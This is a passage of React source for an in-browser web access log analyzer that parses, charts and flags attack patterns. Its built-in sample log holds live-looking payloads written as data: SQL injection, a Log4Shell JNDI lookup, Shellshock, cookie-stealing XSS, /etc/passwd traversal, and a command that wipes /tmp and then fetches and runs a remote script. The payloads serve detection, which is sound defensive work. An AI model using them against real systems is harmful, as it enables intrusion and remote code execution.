/**
 * Web access log analyzer.
 *
 * Reads Apache and nginx access logs in the common or combined format,
 * pasted or chosen as a file (gzip-compressed rotations included, through
 * the browser's own DecompressionStream). Every line is parsed into its
 * fields, summarized, and matched against attack patterns. Filters recompute
 * every summary from the matching lines only. The log never leaves the tab:
 * it is held in component state and nothing is stored or sent.
 */

import { useDeferredValue, useMemo, useRef, useState } from "react";
import type { ChangeEvent, DragEvent, KeyboardEvent, PointerEvent } from "react";
import { ToolShell, ToolPanel, ToolResult } from "./ToolShell";
import { CopyButton } from "@/components/ui/copy-button";
import { pluralise } from "@/lib/plural";
import {
  DISCOVERY_MIN_404,
  DISCOVERY_MIN_SHARE,
  MAX_INPUT_BYTES,
  MAX_LINES,
  RULES,
  explainEntry,
  filterEntries,
  formatAtOffset,
  formatBytes,
  normalizeForMatch,
  offsetLabel,
  parseIpFilter,
  parseLog,
  parseStatusFilter,
  readLogBlob,
  reasonPhrase,
  stepLabel,
  summarize,
  type FlagFilter,
  type LogEntry,
  type Severity,
  type Timeline,
} from "@/lib/toolkit/access-log-analyzer";

/* ----------------------------------------------------------------- styles */

const LABEL =
  "font-mono-tight text-[0.625rem] uppercase tracking-[0.32em] text-[hsl(var(--brand-ash))]";
const INPUT_CLASS =
  "mt-2 min-h-[44px] w-full rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.6)] px-4 py-2 font-mono-tight text-sm text-[hsl(var(--brand-bone))] placeholder:text-[hsl(var(--brand-ash))] focus:border-[hsl(var(--brand-signal))] focus:outline-none";
const SELECT_CLASS =
  "mt-2 min-h-[44px] w-full rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.6)] px-3 py-2 font-mono-tight text-sm text-[hsl(var(--brand-bone))] focus:border-[hsl(var(--brand-signal))] focus:outline-none";
const CHIP_CLASS =
  "inline-flex min-h-[44px] items-center rounded-full border border-[hsl(var(--brand-iron))] px-4 font-mono-tight text-[0.625rem] uppercase tracking-[0.18em] text-[hsl(var(--brand-ash))] transition-colors hover:border-[hsl(var(--brand-signal)/0.6)] hover:text-[hsl(var(--brand-bone))] focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))] disabled:opacity-40";
const TH_CLASS =
  "py-2 pr-4 font-mono-tight text-[0.625rem] font-normal uppercase tracking-[0.28em] text-[hsl(var(--brand-ash))]";
const TD_NUM = "py-2 pr-4 text-right font-mono-tight text-xs tabular-nums text-[hsl(var(--brand-bone-dim))]";

const SEVERITY_STYLE: Record<Severity, string> = {
  high: "border-[hsl(var(--brand-danger)/0.5)] bg-[hsl(var(--brand-danger)/0.08)] text-[hsl(var(--brand-danger))]",
  medium: "border-[hsl(var(--brand-amber)/0.5)] bg-[hsl(var(--brand-amber)/0.08)] text-[hsl(var(--brand-amber))]",
  low: "border-[hsl(var(--brand-cyan)/0.45)] bg-[hsl(var(--brand-cyan)/0.07)] text-[hsl(var(--brand-cyan))]",
};

const FLAGGED_PAGE = 50;

/* ----------------------------------------------------------------- sample */

const MON = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];

/** The %t form, "14/Mar/2026:09:00:00 -0700", for the sample's own lines. */
function clfStamp(utcMs: number, offsetMin: number): string {
  const d = new Date(utcMs + offsetMin * 60_000);
  const p = (n: number) => String(n).padStart(2, "0");
  const sign = offsetMin < 0 ? "-" : "+";
  const abs = Math.abs(offsetMin);
  return `${p(d.getUTCDate())}/${MON[d.getUTCMonth()]}/${d.getUTCFullYear()}:${p(d.getUTCHours())}:${p(
    d.getUTCMinutes(),
  )}:${p(d.getUTCSeconds())} ${sign}${p(Math.floor(abs / 60))}${p(abs % 60)}`;
}

/** Documentation addresses only (RFC 5737 and RFC 3849). */
function sampleLog(): string {
  const base = Date.UTC(2026, 2, 14, 16, 0, 0);
  const chrome =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
  const firefox = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0";
  const iphone =
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1";
  const site = "https://www.example.com/";
  const rows: [number, string, string, number, string, string, string][] = [
    [5, "203.0.113.10", "GET / HTTP/2.0", 200, "5120", "-", chrome],
    [6, "203.0.113.10", "GET /css/site.css HTTP/2.0", 200, "18233", site, chrome],
    [6, "203.0.113.10", "GET /js/app.js HTTP/2.0", 200, "40211", site, chrome],
    [7, "203.0.113.10", "GET /favicon.ico HTTP/2.0", 200, "1150", site, chrome],
    [62, "203.0.113.11", "GET /blog/subnetting-basics HTTP/1.1", 200, "22410", "https://duckduckgo.com/", firefox],
    [63, "203.0.113.11", "GET /css/site.css HTTP/1.1", 304, "-", `${site}blog/subnetting-basics`, firefox],
    [140, "2001:db8:85a3::8a2e:370:7334", "GET /tools/ HTTP/2.0", 200, "9182", "-", iphone],
    [180, "192.0.2.99", "GET /.env HTTP/1.1", 404, "153", "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"],
    [181, "192.0.2.99", "GET /.git/config HTTP/1.1", 404, "153", "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"],
    [181, "192.0.2.99", "GET /wp-login.php HTTP/1.1", 404, "153", "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"],
    [182, "192.0.2.99", "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", 404, "153", "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"],
    [300, "203.0.113.12", "POST /api/contact HTTP/1.1", 201, "64", `${site}contact`, chrome],
    [420, "203.0.113.12", "GET /api/status HTTP/1.1", 502, "157", site, chrome],
    [425, "203.0.113.12", "GET /api/status HTTP/1.1", 200, "48", site, chrome],
    [600, "192.0.2.44", "GET /products.php?id=1%27%20AND%201%3D1%20--%20- HTTP/1.1", 200, "7311", "-", "sqlmap/1.8.2#stable (https://sqlmap.org)"],
    [601, "192.0.2.44", "GET /products.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7171%2C0x7a%29--%20- HTTP/1.1", 500, "612", "-", "sqlmap/1.8.2#stable (https://sqlmap.org)"],
    [603, "192.0.2.44", "GET /products.php?id=1%27%20AND%20SLEEP%285%29%23 HTTP/1.1", 200, "7311", "-", "sqlmap/1.8.2#stable (https://sqlmap.org)"],
    [900, "198.51.100.77", "GET / HTTP/1.1", 200, "5120", "-", "${jndi:ldap://198.51.100.77:1389/Exploit}"],
    [960, "198.51.100.81", "GET /cgi-bin/status HTTP/1.1", 404, "196", "-", "() { :; }; /bin/bash -c 'id'"],
    [1100, "198.51.100.90", "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1", 200, "3302", "-", chrome],
    [1200, "198.51.100.91", "GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1", 400, "226", "-", "curl/8.5.0"],
    [1320, "198.51.100.92", "POST /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.92/bins.sh;sh+bins.sh HTTP/1.1", 404, "196", "-", "Hello, world"],
    [1500, "192.0.2.150", "CONNECT www.example.org:443 HTTP/1.1", 405, "166", "-", "-"],
    [1560, "192.0.2.151", "\\x16\\x03\\x01\\x00\\xee\\x01\\x00\\x00\\xea\\x03\\x03", 400, "0", "-", "-"],
    [1620, "192.0.2.152", "-", 408, "0", "-", "-"],
    [1700, "198.51.100.5", "GET /nmaplowercheck1773504000 HTTP/1.1", 404, "196", "-", "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"],
    [2400, "203.0.113.10", "GET /blog/ HTTP/2.0", 200, "11804", site, chrome],
    [2700, "203.0.113.13", "GET / HTTP/1.1", 200, "5120", "-", firefox],
  ];
  const words = [
    "admin", "backup", "old", "test", "dev", "api/v1", "config", "uploads", "private", "tmp",
    "staging", "db", "logs", "server", "secret", "files", "images/old", "portal", "panel", "login",
    "cms", "data", "export", "debug", "console", "include", "lib", "src", "core", "beta",
  ];
  words.forEach((w, i) => {
    rows.push([1800 + i * 7, "198.51.100.23", `GET /${w} HTTP/1.1`, 404, "196", "-", "gobuster/3.6"]);
  });
  rows.sort((a, b) => a[0] - b[0]);
  const lines = rows.map(
    ([sec, ip, req, status, bytes, ref, ua]) =>
      `${ip} - - [${clfStamp(base + sec * 1000, -420)}] "${req}" ${status} ${bytes} "${ref}" "${ua}"`,
  );
  lines.splice(20, 0, "203.0.113.10 - - [14/Mar/2026:09:12:");
  return lines.join("\n") + "\n";
}

/* ------------------------------------------------------------------ chart */

const CLASS_SERIES = [
  { key: "ok", label: "1xx to 3xx", fill: "hsl(var(--brand-signal))", swatch: "bg-[hsl(var(--brand-signal))]" },
  { key: "client", label: "4xx", fill: "hsl(var(--brand-amber))", swatch: "bg-[hsl(var(--brand-amber))]" },
  { key: "server", label: "5xx", fill: "hsl(var(--brand-danger))", swatch: "bg-[hsl(var(--brand-danger))]" },
  { key: "other", label: "Other", fill: "hsl(var(--brand-ash))", swatch: "bg-[hsl(var(--brand-ash))]" },
] as const;

function TimelineChart({ timeline }: { timeline: Timeline }) {
  const [active, setActive] = useState<number | null>(null);
  const n = timeline.buckets.length;
  const peak = Math.max(1, timeline.peak);
  const slot = 10;
  const at = (i: number) => formatAtOffset(timeline.buckets[i].start, timeline.offsetMin);
  const hasOther = timeline.buckets.some((b) => b.other > 0);
  const series = CLASS_SERIES.filter((s) => s.key !== "other" || hasOther);

  function onPointer(e: PointerEvent<HTMLDivElement>) {
    const rect = e.currentTarget.getBoundingClientRect();
    if (rect.width <= 0) return;
    const i = Math.floor(((e.clientX - rect.left) / rect.width) * n);
    setActive(Math.max(0, Math.min(n - 1, i)));
  }

  function onKey(e: KeyboardEvent<HTMLDivElement>) {
    const cur = active ?? 0;
    let next: number | null = null;
    if (e.key === "ArrowRight") next = Math.min(n - 1, cur + 1);
    else if (e.key === "ArrowLeft") next = Math.max(0, cur - 1);
    else if (e.key === "Home") next = 0;
    else if (e.key === "End") next = n - 1;
    if (next !== null) {
      e.preventDefault();
      setActive(next);
    }
  }

  const b = active !== null ? timeline.buckets[active] : null;

  return (
    <div>
      <div className="flex flex-wrap items-center gap-x-5 gap-y-2" aria-hidden="true">
        {series.map((s) => (
          <span key={s.key} className="inline-flex items-center gap-2 font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
            <span className={`inline-block h-2.5 w-2.5 rounded-sm ${s.swatch}`} />
            {s.label}
          </span>
        ))}
      </div>
      <div className="mt-3 grid grid-cols-[auto_minmax(0,1fr)] gap-x-2">
        <div className="relative h-44 w-10 font-mono-tight text-[0.625rem] tabular-nums text-[hsl(var(--brand-ash))]" aria-hidden="true">
          <span className="absolute right-0 top-0 -translate-y-1/2">{peak.toLocaleString("en-US")}</span>
          <span className="absolute right-0 top-1/2 -translate-y-1/2">{Math.round(peak / 2).toLocaleString("en-US")}</span>
          <span className="absolute bottom-0 right-0 translate-y-1/2">0</span>
        </div>
        <div
          tabIndex={0}
          role="group"
          aria-label={`Requests per ${stepLabel(timeline.bucketMs)}, ${n} ${pluralise(n, "bar")}. Use the arrow keys to read each bar.`}
          aria-describedby="timeline-readout"
          onPointerMove={onPointer}
          onPointerDown={onPointer}
          onPointerLeave={() => setActive(null)}
          onKeyDown={onKey}
          onFocus={() => setActive((a) => a ?? n - 1)}
          onBlur={() => setActive(null)}
          className="h-44 rounded-md focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[hsl(var(--brand-signal))]"
          data-testid="chart-timeline"
        >
          <svg viewBox={`0 0 ${n * slot} 100`} preserveAspectRatio="none" className="block h-full w-full" aria-hidden="true">
            {[0, 50, 100].map((y) => (
              <line key={y} x1="0" x2={n * slot} y1={y} y2={y} stroke="hsl(var(--brand-iron))" strokeWidth="1" vectorEffect="non-scaling-stroke" />
            ))}
            {timeline.buckets.map((bucket, i) => {
              let y = 100;
              return (
                <g key={bucket.start} opacity={active === null || active === i ? 1 : 0.45}>
                  {series.map((s) => {
                    const v = bucket[s.key];
                    if (v === 0) return null;
                    const h = (v / peak) * 100;
                    y -= h;
                    return <rect key={s.key} x={i * slot + 1.5} y={y} width={slot - 3} height={h} fill={s.fill} />;
                  })}
                </g>
              );
            })}
          </svg>
        </div>
        <div />
        <div className="relative mt-2 h-4 font-mono-tight text-[0.625rem] text-[hsl(var(--brand-ash))]" aria-hidden="true">
          <span className="absolute left-0">{at(0)}</span>
          {n > 2 ? <span className="absolute right-0">{at(n - 1)}</span> : null}
        </div>
      </div>
      <p
        id="timeline-readout"
        aria-live="polite"
        className="mt-3 min-h-[2.5rem] font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]"
      >
        {b ? (
          <>
            <span className="text-[hsl(var(--brand-bone))]">{at(active as number)}</span>, {stepLabel(timeline.bucketMs)}:{" "}
            {b.total.toLocaleString("en-US")} {pluralise(b.total, "request")} ({b.ok.toLocaleString("en-US")} 1xx to 3xx,{" "}
            {b.client.toLocaleString("en-US")} 4xx, {b.server.toLocaleString("en-US")} 5xx
            {b.other ? `, ${b.other.toLocaleString("en-US")} other` : ""})
          </>
        ) : (
          "Point at a bar, or focus the chart and use the arrow keys, to read its counts."
        )}
      </p>
    </div>
  );
}

/* ---------------------------------------------------------------- helpers */

function errorText(err: unknown): string {
  return err instanceof Error && err.message ? err.message : "unexpected error";
}

function share(part: number, whole: number): string {
  if (whole === 0) return "0%";
  const pct = (part / whole) * 100;
  return pct > 0 && pct < 0.1 ? "<0.1%" : `${pct.toFixed(1)}%`;
}

interface LoadedFile {
  name: string;
  size: number;
  text: string;
  gzip: boolean;
  capped: boolean;
  bytesRead: number;
}

function FlaggedRow({ entry }: { entry: LogEntry }) {
  const explanations = useMemo(() => explainEntry(entry), [entry]);
  // A request line that did not split into method and target is shown
  // decoded as a whole, since that is the text the patterns ran on.
  const scanned = entry.method ? entry.target : entry.request === "-" ? "" : entry.request;
  const decoded = /%|\\x/i.test(scanned) ? normalizeForMatch(scanned) : null;
  return (
    <li className="rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.5)] p-3">
      <div className="flex flex-wrap items-baseline gap-x-3 gap-y-1 font-mono-tight text-xs">
        <span className="text-[hsl(var(--brand-ash))]">line {entry.line.toLocaleString("en-US")}</span>
        <span className="text-[hsl(var(--brand-bone-dim))]">{formatAtOffset(entry.time, entry.offsetMin, true)}</span>
        <span className="break-all text-[hsl(var(--brand-signal))]">{entry.ip}</span>
        <span className="text-[hsl(var(--brand-bone))]">
          {entry.status} <span className="text-[hsl(var(--brand-ash))]">{reasonPhrase(entry.status)}</span>
        </span>
      </div>
      <p className="mt-2 break-all font-mono-tight text-sm text-[hsl(var(--brand-bone))]">
        {entry.request === "" ? "(empty request line)" : entry.request}
      </p>
      {decoded && decoded !== scanned.toLowerCase() ? (
        <p className="mt-1 break-all font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
          <span className="text-[hsl(var(--brand-ash))]">decoded: </span>
          {decoded}
        </p>
      ) : null}
      {entry.userAgent ? (
        <p className="mt-1 break-all font-mono-tight text-xs text-[hsl(var(--brand-ash))]">UA: {entry.userAgent}</p>
      ) : null}
      <ul className="mt-2 flex flex-wrap gap-2">
        {explanations.map((x) => (
          <li
            key={x.rule.id}
            className={`rounded-full border px-3 py-1 font-mono-tight text-[0.6875rem] ${SEVERITY_STYLE[x.rule.severity]}`}
          >
            {x.rule.label}
            {x.detail ? `: ${x.detail}` : ""}
          </li>
        ))}
      </ul>
    </li>
  );
}

/* ------------------------------------------------------------------- page */

export function AccessLogAnalyzer() {
  const [pasted, setPasted] = useState("");
  const [file, setFile] = useState<LoadedFile | null>(null);
  const [busy, setBusy] = useState(false);
  const [readError, setReadError] = useState<string | null>(null);
  const [dragging, setDragging] = useState(false);
  const [ipFilter, setIpFilter] = useState("");
  const [statusFilter, setStatusFilter] = useState("");
  const [flagFilter, setFlagFilter] = useState<FlagFilter>("all");
  const [flaggedLimit, setFlaggedLimit] = useState(FLAGGED_PAGE);
  const runRef = useRef(0);

  const deferredPaste = useDeferredValue(pasted);

  // A paste over the cap is cut at the last whole line inside it, the same
  // rule a file read follows, and the reader is told.
  const source = useMemo(() => {
    if (file) return { text: file.text, capped: file.capped };
    if (deferredPaste.length <= MAX_INPUT_BYTES) return { text: deferredPaste, capped: false };
    const head = deferredPaste.slice(0, MAX_INPUT_BYTES);
    const nl = head.lastIndexOf("\n");
    return { text: nl === -1 ? head : head.slice(0, nl + 1), capped: true };
  }, [file, deferredPaste]);

  const parsed = useMemo(() => parseLog(source.text), [source.text]);
  const ipParsed = useMemo(() => parseIpFilter(ipFilter), [ipFilter]);
  const statusParsed = useMemo(() => parseStatusFilter(statusFilter), [statusFilter]);
  const ipTest = ipParsed.ok ? ipParsed.value : null;
  const statusTest = statusParsed.ok ? statusParsed.value : null;

  const filtered = useMemo(
    () => filterEntries(parsed.entries, ipTest, statusTest, flagFilter),
    [parsed.entries, ipTest, statusTest, flagFilter],
  );
  const summary = useMemo(() => summarize(filtered), [filtered]);
  const flagged = useMemo(() => filtered.filter((e) => e.flags !== 0), [filtered]);
  const filtering = ipTest !== null || statusTest !== null || flagFilter !== "all";

  async function loadFile(f: File) {
    const run = ++runRef.current;
    setReadError(null);
    setBusy(true);
    setFlaggedLimit(FLAGGED_PAGE);
    try {
      const out = await readLogBlob(f, MAX_INPUT_BYTES);
      if (run !== runRef.current) return;
      setFile({ name: f.name, size: f.size, ...out });
      setPasted("");
    } catch (err) {
      if (run === runRef.current) {
        setFile(null);
        setReadError(`Could not read ${f.name || "the file"}: ${errorText(err)}`);
      }
    } finally {
      if (run === runRef.current) setBusy(false);
    }
  }

  function onFileChosen(e: ChangeEvent<HTMLInputElement>) {
    const input = e.currentTarget;
    const f = input.files?.[0];
    input.value = "";
    if (f) void loadFile(f);
  }

  function onDrop(e: DragEvent<HTMLDivElement>) {
    e.preventDefault();
    setDragging(false);
    const f = e.dataTransfer.files[0];
    if (f) void loadFile(f);
  }

  function onPaste(value: string) {
    runRef.current++;
    setBusy(false);
    setFile(null);
    setReadError(null);
    setPasted(value);
    setFlaggedLimit(FLAGGED_PAGE);
  }

  function clearAll() {
    onPaste("");
    setIpFilter("");
    setStatusFilter("");
    setFlagFilter("all");
  }

  const hasInput = source.text.trim() !== "";
  const stale = !file && pasted !== deferredPaste;
  const tl = summary.timeline;

  const statusLine = readError
    ? readError
    : busy
      ? "Reading the file."
      : !hasInput
        ? file
          ? `${file.name || "The file"} holds no text to analyze.`
          : "Paste log lines or choose a file to analyze them."
        : parsed.entries.length === 0
          ? `None of the ${parsed.examined.toLocaleString("en-US")} ${pluralise(parsed.examined, "line")} matched the common or combined format.`
          : `${parsed.entries.length.toLocaleString("en-US")} ${pluralise(parsed.entries.length, "request")} parsed, ${summary.flaggedRequests.toLocaleString("en-US")} of ${filtered.length.toLocaleString("en-US")} shown flagged.`;

  return (
    <ToolShell slug="access-log-analyzer">
      <div className="space-y-6">
        <ToolPanel title="Log input">
          <label htmlFor="log-file" className="mb-2 block font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
            Choose an access log, plain or gzip compressed (first {formatBytes(MAX_INPUT_BYTES)} of text, up to{" "}
            {MAX_LINES.toLocaleString("en-US")} lines)
          </label>
          <div
            onDragOver={(e) => {
              e.preventDefault();
              setDragging(true);
            }}
            onDragLeave={() => setDragging(false)}
            onDrop={onDrop}
            data-testid="dropzone"
            className={`rounded-xl border border-dashed p-4 transition-colors ${
              dragging
                ? "border-[hsl(var(--brand-signal))] bg-[hsl(var(--brand-signal)/0.06)]"
                : "border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.5)]"
            }`}
          >
            <input
              id="log-file"
              type="file"
              onChange={onFileChosen}
              data-testid="input-log-file"
              className="block min-h-[44px] w-full cursor-pointer font-mono-tight text-sm text-[hsl(var(--brand-bone))] file:mr-4 file:min-h-[44px] file:cursor-pointer file:rounded-lg file:border file:border-[hsl(var(--brand-iron))] file:bg-transparent file:px-4 file:font-mono-tight file:text-xs file:uppercase file:tracking-[0.18em] file:text-[hsl(var(--brand-bone))]"
            />
            <p className="mt-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
              Or drop a file here. Rotated logs such as access.log.2.gz are decompressed in this tab.
            </p>
          </div>

          <label htmlFor="log-input" className="mt-5 block font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
            Or paste log lines
          </label>
          <textarea
            id="log-input"
            value={pasted}
            onChange={(e) => onPaste(e.target.value)}
            rows={7}
            spellCheck={false}
            autoComplete="off"
            autoCapitalize="off"
            autoCorrect="off"
            wrap="off"
            placeholder={'203.0.113.10 - - [14/Mar/2026:09:00:05 -0700] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0"'}
            data-testid="input-log"
            className="mt-2 w-full resize-y overflow-x-auto rounded-lg border border-[hsl(var(--brand-iron))] bg-[hsl(var(--brand-obsidian)/0.6)] px-4 py-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone))] placeholder:text-[hsl(var(--brand-ash))] focus:border-[hsl(var(--brand-signal))] focus:outline-none"
          />

          <div className="mt-3 flex flex-wrap items-center gap-2">
            <button type="button" onClick={() => onPaste(sampleLog())} data-testid="button-sample" className={CHIP_CLASS}>
              Load sample log
            </button>
            {hasInput || file ? (
              <button type="button" onClick={clearAll} data-testid="button-clear" className={CHIP_CLASS}>
                Clear
              </button>
            ) : null}
            {busy ? <span className="font-mono-tight text-xs text-[hsl(var(--brand-cyan))]">Reading file</span> : null}
            {stale ? <span className="font-mono-tight text-xs text-[hsl(var(--brand-cyan))]">Updating</span> : null}
          </div>

          {readError ? (
            <p role="alert" data-testid="text-read-error" className="mt-4 rounded-lg border border-[hsl(var(--brand-danger)/0.5)] bg-[hsl(var(--brand-danger)/0.08)] p-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-danger))]">
              {readError}
            </p>
          ) : null}

          {file ? (
            <p className="mt-4 break-all font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-bone-dim))]">
              <span className="text-[hsl(var(--brand-bone))]">{file.name || "(no name)"}</span>, {formatBytes(file.size)}
              {file.gzip ? `, gzip, ${formatBytes(file.bytesRead)} of text read` : ""}.
            </p>
          ) : null}
          {source.capped ? (
            <p className="mt-3 rounded-lg border border-[hsl(var(--brand-amber)/0.5)] bg-[hsl(var(--brand-amber)/0.08)] p-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-amber))]">
              Only the first {formatBytes(MAX_INPUT_BYTES)} of text were analyzed, cut at the last whole line. Split the log
              (for example with <code>split -C 20M</code>) to read the rest.
            </p>
          ) : null}
          {parsed.truncated ? (
            <p className="mt-3 rounded-lg border border-[hsl(var(--brand-amber)/0.5)] bg-[hsl(var(--brand-amber)/0.08)] p-3 font-mono-tight text-xs leading-relaxed text-[hsl(var(--brand-amber))]">
              Stopped after {MAX_LINES.toLocaleString("en-US")} lines. Everything after that was not read.
            </p>
          ) : null}
        </ToolPanel>

        <p
          role="status"
          aria-live="polite"
          data-testid="text-summary"
          className="font-mono-tight text-xs uppercase tracking-[0.24em] text-[hsl(var(--brand-ash))]"
        >
          {statusLine}
        </p>

        {parsed.entries.length > 0 ? (
          <>
            <ToolPanel title="Filter">
              <div className="grid grid-cols-1 gap-4 md:grid-cols-3">
                <div>
                  <label htmlFor="filter-ip" className={LABEL}>
                    IP address
                  </label>
                  <input
                    id="filter-ip"
                    value={ipFilter}
                    onChange={(e) => {
                      setIpFilter(e.target.value);
                      setFlaggedLimit(FLAGGED_PAGE);
                    }}
                    spellCheck={false}
                    autoCapitalize="off"
                    autoCorrect="off"
                    placeholder="198.51.100.0/24, 2001:db8::/32"
                    aria-invalid={!ipParsed.ok}
                    aria-describedby="filter-ip-help"
                    data-testid="input-filter-ip"
                    className={INPUT_CLASS}
                  />
                  <p
                    id="filter-ip-help"
                    role={ipParsed.ok ? undefined : "alert"}
                    className={`mt-2 font-mono-tight text-xs leading-relaxed ${ipParsed.ok ? "text-[hsl(var(--brand-ash))]" : "text-[hsl(var(--brand-danger))]"}`}
                  >
                    {ipParsed.ok ? "Exact address, CIDR block or prefix ending in *. Commas for several." : ipParsed.error}
                  </p>
                </div>
                <div>
                  <label htmlFor="filter-status" className={LABEL}>
                    Status
                  </label>
                  <input
                    id="filter-status"
                    value={statusFilter}
                    onChange={(e) => {
                      setStatusFilter(e.target.value);
                      setFlaggedLimit(FLAGGED_PAGE);
                    }}
                    spellCheck={false}
                    autoCapitalize="off"
                    autoCorrect="off"
                    placeholder="4xx, 500-504"
                    aria-invalid={!statusParsed.ok}
                    aria-describedby="filter-status-help"
                    data-testid="input-filter-status"
                    className={INPUT_CLASS}
                  />
                  <p
                    id="filter-status-help"
                    role={statusParsed.ok ? undefined : "alert"}
                    className={`mt-2 font-mono-tight text-xs leading-relaxed ${statusParsed.ok ? "text-[hsl(var(--brand-ash))]" : "text-[hsl(var(--brand-danger))]"}`}
                  >
                    {statusParsed.ok ? "A code (404), a class (4xx) or a range (500-504)." : statusParsed.error}
                  </p>
                </div>
                <div>
                  <label htmlFor="filter-flag" className={LABEL}>
                    Findings
                  </label>
                  <select
                    id="filter-flag"
                    value={flagFilter}
                    onChange={(e) => {
                      setFlagFilter(e.target.value as FlagFilter);
                      setFlaggedLimit(FLAGGED_PAGE);
                    }}
                    data-testid="select-filter-flag"
                    className={SELECT_CLASS}
                  >
                    <option value="all">All requests</option>
                    <option value="flagged">Any finding</option>
                    <option value="clean">No findings</option>
                    {RULES.map((r) => (
                      <option key={r.id} value={r.id}>
                        {r.label}
                      </option>
                    ))}
                  </select>
                </div>
              </div>
              {filtering ? (
                <div className="mt-4 flex flex-wrap items-center gap-3">
                  <span className="font-mono-tight text-xs text-[hsl(var(--brand-bone-dim))]">
                    {filtered.length.toLocaleString("en-US")} of {parsed.entries.length.toLocaleString("en-US")}{" "}
                    {pluralise(parsed.entries.length, "request")} match. Every panel below counts these only.
                  </span>
                  <button
                    type="button"
                    onClick={() => {
                      setIpFilter("");
                      setStatusFilter("");
                      setFlagFilter("all");
                    }}
                    className={CHIP_CLASS}
                  >
                    Clear filters
                  </button>
                </div>
              ) : null}
            </ToolPanel>

            <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
              <ToolPanel title="Overview">
                <div data-testid="output-overview">
                  <ToolResult label="Lines read" value={parsed.examined.toLocaleString("en-US")} />
                  <ToolResult
                    label="Parsed"
                    value={`${parsed.entries.length.toLocaleString("en-US")} (${parsed.formats.combined.toLocaleString("en-US")} combined, ${parsed.formats.common.toLocaleString("en-US")} common)`}
                  />
                  <ToolResult
                    label="Unparsed"
                    value={parsed.unparsedCount.toLocaleString("en-US")}
                    testId="text-unparsed-count"
                  />
                  <ToolResult label="Requests shown" value={summary.requests.toLocaleString("en-US")} testId="text-requests" />
                  <ToolResult label="Unique IPs" value={summary.uniqueIps.toLocaleString("en-US")} />
                  <ToolResult label="Bytes sent" value={formatBytes(summary.bytes)} />
                  <ToolResult
                    label="Flagged"
                    value={`${summary.flaggedRequests.toLocaleString("en-US")} ${pluralise(summary.flaggedRequests, "request")} from ${summary.flaggedIps.length.toLocaleString("en-US")} ${pluralise(summary.flaggedIps.length, "IP")}`}
                    testId="text-flagged"
                  />
                  {summary.first !== null && summary.last !== null && tl ? (
                    <ToolResult
                      label="Time range"
                      value={`${formatAtOffset(summary.first, tl.offsetMin, true)} to ${formatAtOffset(summary.last, tl.offsetMin, true)} ${offsetLabel(tl.offsetMin)}`}
                    />
                  ) : null}
                  {summary.methods.length ? (
                    <ToolResult label="Methods" value={summary.methods.map((m) => `${m.key} ${m.count.toLocaleString("en-US")}`).join(", ")} />
                  ) : null}
                </div>
              </ToolPanel>

              <ToolPanel title="Status codes">
                {summary.statuses.length === 0 ? (
                  <p className="font-mono-tight text-sm text-[hsl(var(--brand-ash))]">No requests match the filters.</p>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full min-w-[320px] border-collapse text-left" data-testid="table-status">
                      <thead>
                        <tr className="border-b border-[hsl(var(--brand-iron))]">
                          <th scope="col" className={TH_CLASS}>Code</th>
                          <th scope="col" className={TH_CLASS}>Count</th>
                          <th scope="col" className={`${TH_CLASS} w-[40%]`}>Share</th>
                        </tr>
                      </thead>
                      <tbody>
                        {summary.statuses.map((s) => {
                          const tone =
                            s.status >= 500 && s.status < 600
                              ? "bg-[hsl(var(--brand-danger)/0.85)]"
                              : s.status >= 400 && s.status < 500
                                ? "bg-[hsl(var(--brand-amber)/0.85)]"
                                : "bg-[hsl(var(--brand-signal)/0.85)]";
                          return (
                            <tr key={s.status} className="border-b border-[hsl(var(--brand-iron)/0.5)]">
                              <th scope="row" className="py-2 pr-4 text-left font-mono-tight text-sm font-normal text-[hsl(var(--brand-bone))]">
                                {s.status}{" "}
                                <span className="text-xs text-[hsl(var(--brand-ash))]">{reasonPhrase(s.status)}</span>
                              </th>
                              <td className="py-2 pr-4 font-mono-tight text-xs tabular-nums text-[hsl(var(--brand-bone-dim))]">
                                {s.count.toLocaleString("en-US")}
                              </td>
                              <td className="py-2">
                                <div className="flex items-center gap-2">
                                  <div className="relative h-2 flex-1 rounded-full bg-[hsl(var(--brand-obsidian)/0.8)]" aria-hidden="true">
                                    <div
